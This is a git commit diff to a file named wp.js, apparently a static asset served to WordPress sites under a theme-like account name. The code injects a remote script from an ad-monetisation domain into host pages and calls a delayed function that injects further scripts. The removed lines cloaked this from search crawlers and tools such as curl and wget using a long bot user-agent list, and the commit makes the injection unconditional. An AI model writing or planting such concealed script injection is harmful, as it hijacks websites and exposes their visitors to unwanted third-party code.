7fa6f6ae9219ce6fba33f0709a956938f0ee700a
responsivethemesstatic <53955700+responsivethemesstatic@users.noreply.github.com>
2021-09-05 22:09:52 +0300

    Update wp.js

--- wp.js
+++ wp.js
@@ -1,24 +1,12 @@
 function sleep(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
-function ucheck(){
-        var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis|Pinterestbot|bot.html)";
-          var re = new RegExp(botPattern, 'i');
-          var userAgent = navigator.userAgent;
-          if (re.test(userAgent)) {
-              return true;
-          }else{
-            return false;
-          }
-}
-if(ucheck() === false){
-  (function() {
-    var script = document.createElement('script');
-      script.type = 'text/javascript';
-      script.src = '//pl15606332.revenuenetworkcpm.com/b1/ac/56/b1ac56cbcd08bd11bfd56153b48b6533.js';
-      document.body.appendChild(script);
-  })();
-}
+(function() {
+var script = document.createElement('script');
+  script.type = 'text/javascript';
+  script.src = '//pl15606332.revenuenetworkcpm.com/b1/ac/56/b1ac56cbcd08bd11bfd56153b48b6533.js';
+  document.body.appendChild(script);
+})();
 async function relCall() {
         var script, el;
         await sleep(1000);
@@ -65,6 +53,4 @@ async function relCall() {
             el.appendChild(script);
         }
 }
-if(ucheck() === false){
-    relCall();
-}
+relCall();
